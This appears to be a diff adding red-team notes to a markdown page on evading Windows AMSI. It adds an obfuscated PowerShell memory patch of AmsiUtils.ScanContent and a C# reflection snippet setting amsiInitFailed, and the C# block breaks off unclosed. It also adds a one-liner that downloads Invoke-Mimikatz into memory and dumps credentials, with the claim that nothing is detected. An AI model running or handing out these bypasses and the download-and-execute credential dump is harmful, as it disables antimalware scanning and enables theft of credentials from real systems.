@@ -157,6 +157,77 @@ https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024
 
 And finally AMSI.FAIL
 
+or this also works
+
+```powershell
+class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
+$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
+$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
+#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
+#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
+[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
+```
+
+then run
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
+```
+
+No detections, AMSI is disabled
+
+## AMSI Bypass in .NET Binaries
+
+Yes, the AMSI bypass technique provided, which uses reflection to set the `amsiInitFailed` field to `$true`, will also work in .NET binaries, not just in PowerShell.
+
+**Understanding the Technique:**
+
+* **Reflection:** The core of this bypass relies on .NET reflection, which allows code to inspect and modify types, fields, and methods at runtime.
+* **Targeting `amsiInitFailed`:** The code specifically targets the `amsiInitFailed` static field within the `System.Management.Automation.AmsiUtils` class. This field is used to indicate whether the AntiMalware Scan Interface (AMSI) initialization has failed.
+* **Setting to `$true`:** By setting this field to `$true`, the code effectively tells the .NET runtime that AMSI initialization has failed, causing AMSI scans to be skipped.
+
+**How it Works in .NET Binaries:**
+
+1.  **Locating `AmsiUtils`:** Just like in PowerShell, you can use reflection in C# (or other .NET languages) to locate the `System.Management.Automation.AmsiUtils` class.
+2.  **Accessing `amsiInitFailed`:** You can then use reflection to access the `amsiInitFailed` static field.
+3.  **Setting the Value:** Finally, you can use reflection to set the value of the `amsiInitFailed` field to `true`.
+
+**C# Example:**
+
+```csharp
+using System;
+using System.Reflection;
+
+public class AmsiBypass
+{
+    public static void Main(string[] args)
+    {
+        try
+        {
+            // Get the AmsiUtils type
+            Type amsiUtilsType = typeof(System.Management.Automation.AmsiUtils);
+
+            // Get the amsiInitFailed field
+            FieldInfo amsiInitFailedField = amsiUtilsType.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
+
+            // Set the amsiInitFailed field to true
+            if (amsiInitFailedField != null)
+            {
+                amsiInitFailedField.SetValue(null, true);
+                Console.WriteLine("AMSI bypassed.");
+            }
+            else
+            {
+                Console.WriteLine("amsiInitFailed field not found.");
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error: {ex.Message}");
+        }
+    }
+}
+
 -----
 # dotnet packing
 
